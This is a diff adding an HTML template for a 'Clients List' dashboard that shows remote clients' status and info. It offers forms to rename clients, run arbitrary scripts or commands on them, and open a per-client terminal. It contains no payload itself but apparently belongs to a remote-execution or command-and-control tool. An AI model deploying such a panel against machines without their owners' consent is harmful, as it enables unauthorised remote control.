@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Clients</title></head>
+<body>
+    <h1>Clients List</h1>
+    <table border="1">
+        <tr><th>ID/Name</th><th>Online</th><th>Last Seen</th><th>Info</th><th>Actions</th></tr>
+        {% for client in clients %}
+        <tr>
+            <td>{{ client.name }} ({{ client.id[:8] }})</td>
+            <td style="color: {% if client.online %}green{% else %}red{% endif %};">{{ 'Online' if client.online else 'Offline' }}</td>
+            <td>{{ client.last_seen }}</td>
+            <td>
+                <pre>{{ client.info | tojson }}</pre>
+            </td>
+            <td>
+                <form method="POST" style="display:inline;">
+                    <input type="hidden" name="client_id" value="{{ client.id }}">
+                    <input type="hidden" name="action" value="rename">
+                    <input type="text" name="new_name" placeholder="New name">
+                    <button type="submit">Rename</button>
+                </form>
+                <br>
+                <form method="POST" style="display:inline;">
+                    <input type="hidden" name="client_id" value="{{ client.id }}">
+                    <input type="hidden" name="action" value="execute">
+                    <textarea name="script" placeholder="Script/CMD"></textarea>
+                    <button type="submit">Execute</button>
+                </form>
+                <br>
+                <a href="/terminal/{{ client.id }}">Terminal</a>
+            </td>
+        </tr>
+        {% endfor %}
+    </table>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script>
+        const socket = io();
+        socket.on('connect', () => console.log('Connected'));
+    </script>
+</body>
+</html>
